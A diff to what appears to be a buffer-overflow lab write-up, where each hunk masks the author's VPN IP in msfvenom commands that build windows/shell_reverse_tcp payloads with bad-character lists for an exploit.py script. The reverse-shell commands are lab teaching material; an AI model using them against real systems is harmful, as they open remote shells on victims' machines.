@@ -81,7 +81,7 @@ Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac
 
 - 625011AF = \xaf\x11\x50x62
 
-- ``msfvenom -p windows/shell_reverse_tcp LHOST=10.2.127.225 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c``
+- ``msfvenom -p windows/shell_reverse_tcp LHOST=10.x.x.x LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c``
 
 ##### [](#header-5)Answer the questions below
 
@@ -183,7 +183,7 @@ Choose an address and update your exploit.py script, setting the "retn" variable
 
 Run the following msfvenom command on Kali, using your Kali VPN IP as the LHOST and updating the -b option with all the badchars you identified (including \x00):
 
-- ``msfvenom -p windows/shell_reverse_tcp LHOST=10.2.127.225 LPORT=4444 EXITFUNC=thread -b "\x00\x23\x3c\x83\xba" -f c``
+- ``msfvenom -p windows/shell_reverse_tcp LHOST=10.x.x.x LPORT=4444 EXITFUNC=thread -b "\x00\x23\x3c\x83\xba" -f c``
 
 Copy the generated C code strings and integrate them into your exploit.py script payload variable using the following notation:
 
@@ -311,7 +311,7 @@ Choose an address and update your exploit.py script, setting the "retn" variable
 
 Run the following msfvenom command on Kali, using your Kali VPN IP as the LHOST and updating the -b option with all the badchars you identified (including \x00):
 
-- ``msfvenom -p windows/shell_reverse_tcp LHOST=10.2.127.225 LPORT=4444 EXITFUNC=thread -b "\x00\x11\x40\x5f\xb8\xee" -f c``
+- ``msfvenom -p windows/shell_reverse_tcp LHOST=10.x.x.x LPORT=4444 EXITFUNC=thread -b "\x00\x11\x40\x5f\xb8\xee" -f c``
 
 Copy the generated C code strings and integrate them into your exploit.py script payload variable using the following notation:
 
@@ -441,7 +441,7 @@ Choose an address and update your exploit.py script, setting the "retn" variable
 
 Run the following msfvenom command on Kali, using your Kali VPN IP as the LHOST and updating the -b option with all the badchars you identified (including \x00):
 
-- ``msfvenom -p windows/shell_reverse_tcp LHOST=10.2.127.225 LPORT=4444 EXITFUNC=thread -b "\x00\xa9\xcd\xd4" -f c``
+- ``msfvenom -p windows/shell_reverse_tcp LHOST=10.x.x.x LPORT=4444 EXITFUNC=thread -b "\x00\xa9\xcd\xd4" -f c``
 
 Copy the generated C code strings and integrate them into your exploit.py script payload variable using the following notation:
 
@@ -573,7 +573,7 @@ Choose an address and update your exploit.py script, setting the "retn" variable
 
 Run the following msfvenom command on Kali, using your Kali VPN IP as the LHOST and updating the -b option with all the badchars you identified (including \x00):
 
-- ``msfvenom -p windows/shell_reverse_tcp LHOST=10.2.127.225 LPORT=4444 EXITFUNC=thread -b "\x00\x16\x2f\xf4\xfd" -f c``
+- ``msfvenom -p windows/shell_reverse_tcp LHOST=10.x.x.x LPORT=4444 EXITFUNC=thread -b "\x00\x16\x2f\xf4\xfd" -f c``
 
 Copy the generated C code strings and integrate them into your exploit.py script payload variable using the following notation:
 
@@ -705,7 +705,7 @@ Choose an address and update your exploit.py script, setting the "retn" variable
 
 Run the following msfvenom command on Kali, using your Kali VPN IP as the LHOST and updating the -b option with all the badchars you identified (including \x00):
 
-- ``msfvenom -p windows/shell_reverse_tcp LHOST=10.2.127.225 LPORT=4444 EXITFUNC=thread -b "\x00\x08\x2c\xad" -f c``
+- ``msfvenom -p windows/shell_reverse_tcp LHOST=10.x.x.x LPORT=4444 EXITFUNC=thread -b "\x00\x08\x2c\xad" -f c``
 
 Copy the generated C code strings and integrate them into your exploit.py script payload variable using the following notation:
 
@@ -837,7 +837,7 @@ Choose an address and update your exploit.py script, setting the "retn" variable
 
 Run the following msfvenom command on Kali, using your Kali VPN IP as the LHOST and updating the -b option with all the badchars you identified (including \x00):
 
-- ``msfvenom -p windows/shell_reverse_tcp LHOST=10.2.127.225 LPORT=4444 EXITFUNC=thread -b "\x00\x8c\xae\xbe\xfb" -f c``
+- ``msfvenom -p windows/shell_reverse_tcp LHOST=10.x.x.x LPORT=4444 EXITFUNC=thread -b "\x00\x8c\xae\xbe\xfb" -f c``
 
 Copy the generated C code strings and integrate them into your exploit.py script payload variable using the following notation:
 
@@ -969,7 +969,7 @@ Choose an address and update your exploit.py script, setting the "retn" variable
 
 Run the following msfvenom command on Kali, using your Kali VPN IP as the LHOST and updating the -b option with all the badchars you identified (including \x00):
 
-- ``msfvenom -p windows/shell_reverse_tcp LHOST=10.2.127.225 LPORT=4444 EXITFUNC=thread -b "\x00\x1d\x2e\xc7\xee" -f c``
+- ``msfvenom -p windows/shell_reverse_tcp LHOST=10.x.x.x LPORT=4444 EXITFUNC=thread -b "\x00\x1d\x2e\xc7\xee" -f c``
 
 Copy the generated C code strings and integrate them into your exploit.py script payload variable using the following notation:
 
@@ -1101,7 +1101,7 @@ Choose an address and update your exploit.py script, setting the "retn" variable
 
 Run the following msfvenom command on Kali, using your Kali VPN IP as the LHOST and updating the -b option with all the badchars you identified (including \x00):
 
-- ``msfvenom -p windows/shell_reverse_tcp LHOST=10.2.127.225 LPORT=4444 EXITFUNC=thread -b "\x00\x04\x3e\x3f\xe1" -f c``
+- ``msfvenom -p windows/shell_reverse_tcp LHOST=10.x.x.x LPORT=4444 EXITFUNC=thread -b "\x00\x04\x3e\x3f\xe1" -f c``
 
 Copy the generated C code strings and integrate them into your exploit.py script payload variable using the following notation:
 
@@ -1233,7 +1233,7 @@ Choose an address and update your exploit.py script, setting the "retn" variable
 
 Run the following msfvenom command on Kali, using your Kali VPN IP as the LHOST and updating the -b option with all the badchars you identified (including \x00):
 
-- ``msfvenom -p windows/shell_reverse_tcp LHOST=10.2.127.225 LPORT=4444 EXITFUNC=thread -b "\x00\x04\x3e\x3f\xe1" -f c``
+- ``msfvenom -p windows/shell_reverse_tcp LHOST=10.x.x.x LPORT=4444 EXITFUNC=thread -b "\x00\x04\x3e\x3f\xe1" -f c``
 
 Copy the generated C code strings and integrate them into your exploit.py script payload variable using the following notation:
 
